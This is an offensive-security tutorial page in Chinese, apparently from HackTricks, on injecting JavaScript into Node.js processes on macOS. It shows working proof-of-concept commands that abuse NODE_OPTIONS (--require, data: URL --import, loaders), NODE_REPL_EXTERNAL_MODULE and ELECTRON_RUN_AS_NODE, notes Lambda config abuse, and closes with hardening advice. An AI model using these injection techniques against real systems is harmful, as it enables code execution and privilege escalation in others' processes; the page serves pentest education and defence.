# macOS Node.js Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 概述

如果攻击者能够控制某个进程的环境，而该进程最终会启动 **Node.js**（直接启动 `node` binary，或启动任何基于 Node 的 CLI，例如 `npm`、`npx`、`yarn`、`pnpm`、`eslint`、`tsc`、`next` 等），多个环境变量会使 runtime 在目标程序运行前 **加载并执行攻击者控制的 JavaScript**。对于其他 runtime，这是一种等价于 `PERL5OPT`/`RUBYOPT`/`_JAVA_OPTIONS` 系列的 code-execution primitive。

预加载的代码会在 **同一进程** 中运行，并拥有与受害进程相同的 uid、环境、文件描述符和 entitlements。因此，只要权限更高的进程使用继承的或受攻击者影响的环境启动 Node，这就是一种直接的 injection/priv-esc vector。

## `NODE_OPTIONS` — `--require`（基于文件）

`NODE_OPTIONS` 会被解析为其内容是额外的命令行 flags。`--require`（`-r`）会在 entry point **之前**预加载一个 CommonJS module，因此其顶层代码会最先运行。<sup>[[1]](#references)</sup>
```bash
# Target script
echo "console.log('target script ran')" > /tmp/victim.js

# Attacker-controlled preload module
echo "require('fs').writeFileSync('/tmp/node-require-executed','x'); console.log('[require preload]')" > /tmp/preload.js

NODE_OPTIONS="--require /tmp/preload.js" node /tmp/victim.js
# [require preload]
# target script ran
```
## `NODE_OPTIONS` — 使用 `data:` URL 的 `--import`（无文件）

自 **Node 20.6** 起，`--import` 接受 `data:text/javascript,<code>` URL，因此可以预加载 **ES-module JavaScript**，代码以内联方式存在，磁盘上无需文件，也无需 module directory。代码必须进行**完整的 URL 编码**（原始空格或 `#` 会截断 data URL，并产生 `SyntaxError`）。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Build a fully URL-encoded data: URL payload
node -e 'const js="import(\"fs\").then(f=>f.writeFileSync(\"/tmp/node-import-executed\",\"x\"));console.log(\"[import preload]\")"; console.log("data:text/javascript,"+encodeURIComponent(js))' > /tmp/dataurl.txt

NODE_OPTIONS="--import $(cat /tmp/dataurl.txt)" node /tmp/victim.js
# [import preload]
# target script ran
```
这是在 cloud 中被滥用的技术，例如将 `NODE_OPTIONS` 注入 AWS Lambda 函数的配置（`lambda:UpdateFunctionConfiguration`，不需要 `iam:PassRole`），从而以 execution role 的身份运行 code。

> [!TIP]
> `NODE_OPTIONS` **无法直接运行 code**：`--eval`/`-e`、`-p` 或 script path 等 flags 会被明确拒绝（`node: --eval is not allowed in NODE_OPTIONS`）。应使用 `--require`/`--import` 指向 code。

## `NODE_OPTIONS` — custom loaders / other startup flags

`NODE_OPTIONS` 还支持其他会影响 startup 的 flags，而这些 flags 的副作用是运行 attacker code，例如 ESM loader hook：
```bash
# Node >= 20.6 (loader hooks run in a separate thread)
NODE_OPTIONS="--import ./hooks.mjs" node app.mjs
# Older Node
NODE_OPTIONS="--experimental-loader ./hooks.mjs" node app.mjs
```
任何基于 Node 的 launcher 在生成子 `node` 进程时，通常都会**传播 `NODE_OPTIONS`**，因此注入一次就可能影响整个工具链（`npm run …`、`npx`、构建工具、测试运行器、语言服务器）。

## `NODE_REPL_EXTERNAL_MODULE`

当 Node 启动**交互式 REPL**时，它会加载 `NODE_REPL_EXTERNAL_MODULE` 指定的模块，并执行其顶层代码。当受害者启动交互式 `node`/`node -i` shell（开发工具、维护控制台）时，这非常有用。<sup>[[3]](#references)</sup>
```bash
echo "require('fs').writeFileSync('/tmp/node-repl-executed','x'); module.exports={};" > /tmp/replmod.js
printf '.exit\n' | NODE_REPL_EXTERNAL_MODULE=/tmp/replmod.js node -i
ls -la /tmp/node-repl-executed
```
> [!WARNING]
> 当使用 [`kDisableNodeOptionsEnv`](https://nodejs.org/api/cli.html) protection 启动 child 时，`NODE_REPL_EXTERNAL_MODULE` 会被有意 **忽略**，但直接启动的 interactive REPL 会遵循该变量。

## Electron (`ELECTRON_RUN_AS_NODE`)

当使用 **`ELECTRON_RUN_AS_NODE=1`** 启动时，Electron applications 会重新暴露完整的 Node runtime，此时上述所有 `NODE_OPTIONS` vectors 都会应用于 Electron binary（通常具有签名/entitlement）。参见：

{{#ref}}
macos-electron-applications-injection.md
{{#endref}}

## 其他 JS runtimes

- **Bun** 为兼容性读取 `NODE_OPTIONS`，并支持其自身的 `--preload`（可通过 `bunfig.toml` 配置）。
- **Deno** 不遵循 `NODE_OPTIONS`；它要求使用显式 flags（`--import`、`--preload`），因此不会受到继承的 `NODE_OPTIONS` 影响。

始终确认确切的 runtime 和版本，因为不同版本之间接受的 flags 可能发生变化。

## 加固

- 在从更高权限的 context 启动 Node 之前，从 environment 中移除 `NODE_OPTIONS`、`NODE_REPL_EXTERNAL_MODULE` 和 `ELECTRON_RUN_AS_NODE`；使用经过清理的 environment 启动 child。
- 将设置 target environment 的能力（config injection、`launchd`/`launchctl setenv`、plist/`EnvironmentVariables`、CI variables、Lambda/container config）视为在其启动的任何 Node process 中执行 code 的等价能力。
- 以 [Shield](https://github.com/theevilbit/Shield) 针对 `ELECTRON_RUN_AS_NODE` 和 dyld injection variables 发出 alert 的相同方式，监控 process exec 中出现的这些 variables。

## References

- [1] [Node.js CLI documentation — `NODE_OPTIONS`、`--require`、`--import`](https://nodejs.org/api/cli.html#node_optionsoptions)
- [2] [Node.js ESM — `--import` 和 `data:` URLs](https://nodejs.org/api/esm.html#data-imports)
- [3] [Node.js REPL — `NODE_REPL_EXTERNAL_MODULE`](https://nodejs.org/api/repl.html#environment-variable-options)
{{#include ../../../banners/hacktricks-training.md}}
